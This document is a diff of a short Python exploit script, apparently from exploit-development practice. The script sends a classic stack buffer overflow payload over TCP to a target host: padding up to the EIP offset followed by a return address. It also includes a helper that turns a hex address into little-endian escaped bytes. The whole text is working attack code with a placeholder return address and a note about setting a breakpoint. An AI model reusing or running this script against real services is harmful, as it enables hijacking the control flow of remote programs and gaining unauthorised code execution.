@@ -1,33 +1,42 @@
+#!/usr/bin/python
+
 import socket
 import time
 import sys
 
+if len(sys.argv) == 2:
+    ret = sys.argv[1]
+
+    ret = ret.lower()
+    address = ""
+    for i in range(len(ret)-1,-1,-2):
+        address += "\\x" + ret[i-1] + ret[i]
+    print(address)
+    exit(0) 
 
 
-if len(sys.argv) < 6:
-    print("usage: \"python target.py [host] [port] [size] [eip] [return address]\"") 
-    print("usage: make sure to set a breakpoint at the jump address!")
+if len(sys.argv) != 4:
+    print("usage: \"python jump.py [target] [port] [eip]")
+    print("usage: make sure to change the value of \"ret\"")
+    print("usage: make sure to set a breakpoint at the jump address! as well!")
     exit(0)
 
-host = sys.argv[1]
-port = sys.argv[2]
-size = sys.argv[3]
-eip = sys.argv[4]
-ret = sys.argv[5]
-nop = 32
+target = sys.argv[1]
+port = int(sys.argv[2])
+eip = int(sys.argv[3])
+ret = "change me!"
 
-ret = ret.lower()
-address = ""
-for i in range(len(ret)-1,-1,-2):
-    address += "\\x" + ret[i-1] + ret[i]
+if ret == "change me!":
+    print("you need to change \"ret\" to the output of \"./jump.py [return address]\"")
+    exit(0)
 
-inputBuffer = "A" * size + address + "\x90" * nop + "C" * (size-eip-nop)
+inputBuffer = "A" * eip + ret
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect((host,port))
+s.connect((target,port))
 print("sending buffer")
 s.send(inputBuffer)
-s.recv(1024)
 s.close()
+exit(0)
 
 
 
